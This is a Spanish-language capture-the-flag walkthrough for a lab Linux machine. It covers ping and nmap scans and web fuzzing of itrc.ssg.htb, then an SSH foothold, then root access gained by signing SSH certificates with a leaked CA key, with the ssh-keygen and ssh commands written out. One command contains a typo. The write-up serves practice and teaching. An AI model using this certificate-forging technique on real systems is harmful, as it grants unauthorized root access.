#medium #Linux #tecnicas 
### Ping

```python
ping -c 1 10.10.11.27
PING 10.10.11.27 (10.10.11.27) 56(84) bytes of data.
64 bytes from 10.10.11.27: icmp_seq=1 ttl=63 time=149 ms

--- 10.10.11.27 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 149.269/149.269/149.269/0.000 ms
```

### TTL = 63 Linux

### nmap

```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 16:12 EDT
Nmap scan report for 10.10.11.27
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.39 seconds
```

### Enumeración del puerto 80
primero agregamos la dirección http://itrc.ssg.htb/ a nuestro archivo /etc/hosts. la web nos muestra dos rutas. `Register` `Login`
![[Pasted image 20240807161601.png]]

`Resgister`
después de crear nuestro propio usuario podemos ingresar a la web con las credenciales
![[Pasted image 20240807163716.png]]

### Enumeración con wfuzz
haciendo fuzzing podemos encontrar 3 dominios `assets, uploads, api` 
![[Pasted image 20240807164442.png]]

`fuzzing para archivos pgp,txt,html`
encontramos `index.php` y `admin.php` que son muy interesantes
![[Pasted image 20240807173429.png]]

`index.php?page=admin`
aqui encontramos mas información. en los usuarios previos SSH nos dice que contactemos a `zzinter` un posible usuario. existe un archivo en 
![[Pasted image 20240807173522.png]]


`conexión`
con las credenciales encontradas podemos obtener una conexión vía ssh
![[Pasted image 20240807181359.png]]

`id_rsa`
podemos ver en el directorio lo que parece ser una id_rsa tanto la privada como la publica
![[Pasted image 20240807181911.png]]


`sshkeygen`
debemos crear un directorio temporal en la carpeta `/tmp` debemos crear un nuevo par de claves `id_rsa` y también demos traernos a esta ruta las keys que vimos anteriormente. 

```python
ssh-keygen -t rsa -b 2048 -f id_rsa

ssh-keygen -s ca-itrc -I user-cert -n zzinter -V +52w -z 12345 id_rsa.pub

ssh -o CertificateFile=id_rsa-cert.pub -i id_rsa zzinter@localhost

mv ca-itrc ca-itrc.pub
```

![[Pasted image 20240807184214.png]]

```python
ssh-keygen -t rsa -b 2048 -f root

ssh-keygen -s ca-itrc -I ca-itrc.pub -n root root.pub

ssh -o CertificateFile+root-cert.pub -i root root@localhost
```
